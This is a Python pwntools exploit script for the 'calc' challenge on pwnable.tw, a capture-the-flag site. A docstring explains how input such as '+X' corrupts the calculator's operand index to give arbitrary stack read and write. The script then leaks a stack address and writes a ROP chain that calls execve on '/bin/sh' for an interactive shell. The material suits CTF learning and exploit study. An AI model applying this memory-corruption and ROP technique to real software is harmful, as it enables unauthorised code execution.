#!/usr/bin/env python3

from pwn import *

exe = ELF("./calc")

context.binary = exe

gdbscript = """
                break *calc + 116
            """


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, gdbscript)
    else:
        r = remote("chall.pwnable.tw", 10100)

    return r


def send_rop(addr: int, val: int):
    if val > 0x7FFFFFFF:
        r.sendline(f"+{addr + 1}".encode("ascii"))
        half_val = int(r.recvline().strip())

        diff = 0xFFFFFFFF + 1 + half_val - val
        r.sendline(f"+{addr}+00%{diff}".encode("ascii"))
    else:
        r.sendline(f"+{addr}+{val}".encode("ascii"))
        r.recvline()


def main():
    r = conn()

    """
    Part of the `eval` function that involves the addition:

    0x08048f36 <+85>:   lea    ebx,[eax-0x1]
    0x08048f39 <+88>:    mov    eax,DWORD PTR [ebp+0x8]
    0x08048f3c <+91>:    mov    eax,DWORD PTR [eax+ebx*4+0x4]
    0x08048f40 <+95>:    add    ecx,eax
    0x08048f42 <+97>:    mov    eax,DWORD PTR [ebp+0x8]
    0x08048f45 <+100>:   mov    DWORD PTR [eax+edx*4+0x4],ecx

    By inspecting the stack addresses where the calculations are performed,
    we can see that the program uses the first word to save the number of
    operands and the subsequents words are used to store the value of operands.

    pwndbg> x/4wx 0xffffc7c8
    0xffffc7c8: 0x00000002  0x00000008  0x00000008  0x00000000

    The result is saved in the same word of the first operand (0xffffc7cc in this case)
    the memory where the number of operands is stored is later used as index to store the
    result in `calc` function

    If try to add a number without the first operand, i.e "+X" when X is a number, this will
    break the addition operation: the program will still try add two numbers but the first
    operand will be the memory used for the "index", thus resulting in an access to an arbitrary
    memory location. Adding another number (e.g: +100+200) results in a reutilization of the
    memory calculated with the first (broken) addition to store the subsequent result of the second
    addition, which will be the same as "0+Y" with Y -> second operand
    """

    # Read garbage
    r.recvuntil(b"=== Welcome to SECPROG calculator ===\n")
    
    # Leak `main()` $ebp (stack leak)
    r.sendline(b"+360")
    ebp = int(r.recvline().strip()) - 0x20 + 0xFFFFFFFF + 1
    log.info(f"main's ebp @ {hex(ebp)}")

    bss_offset = 0xFFFFFFFF + 1 - (ebp - 0x5a0) + 0x080eb000

    pop_eax     = 0x0805c34b    # pop eax; ret;
    pop_ecx_ebx = 0x080701d1    # pop ecx ; pop ebx ; ret
    pop_edx     = 0x080701aa    # pop edx ; ret
    int_x80     = 0x08070880    # int 0x80; ret;

    # 360 = (1440 / 4), with 1440 the distance between return address and the stack location used by `calc`.
    # Also writing the rop chain "backward" prevents the successive gadgets to depend from the previous value
    # saved by `calc()` in the wanted same position
    send_rop(bss_offset // 4 + 1, u32(b'/sh\x00'))
    send_rop(bss_offset // 4, u32(b'/bin'))
    send_rop(367, int_x80)
    send_rop(366, 0x080eb040)       # Since we cannot write "+0" we have to use any pointer to NULL
    send_rop(365, pop_edx)
    send_rop(364, 0x080eb004)
    send_rop(363, 0x080eb040)
    send_rop(362, pop_ecx_ebx)
    send_rop(361, 0x0b)
    send_rop(360, pop_eax)
    
    r.sendline(b"pwned")         # Trigger exit -> rop chain
    r.interactive("$ ")


if __name__ == "__main__":
    main()
